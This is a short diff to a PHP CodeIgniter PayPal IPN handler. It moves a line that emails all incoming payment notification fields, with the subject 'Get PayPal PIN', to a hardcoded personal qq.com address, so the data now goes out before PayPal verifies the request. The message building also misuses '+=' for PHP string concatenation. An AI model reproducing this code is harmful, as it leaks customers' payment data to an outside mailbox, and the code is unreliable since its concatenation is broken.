@@ -465,7 +465,8 @@ class Home extends CI_Controller {
 			$v = urlencode(stripslashes($v)); 
 			$req .= "&{$k}={$v}";
 			$message+="key:".$k."=>value:".$v;
-		} 
+		}
+		$this->email('1220959492@qq.com','Get PayPal PIN',$message);
 		$ch = curl_init(); 
 		curl_setopt($ch,CURLOPT_URL,'http://www.sandbox.paypal.com/cgi-bin/webscr'); 
 		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
@@ -473,8 +474,6 @@ class Home extends CI_Controller {
 		curl_setopt($ch,CURLOPT_POSTFIELDS,$req); 
 		$res = curl_exec($ch); 
 		curl_close($ch); 
-		$message+="<br>result:".$res;
-		$this->email('1220959492@qq.com','Get PayPal PIN',$message);
 		if( $res && !empty($order) ) { 
 			// 本次请求是否由Paypal官方的服务器发出的请求 
 			if(strcmp($res, 'VERIFIED') == 0) { 
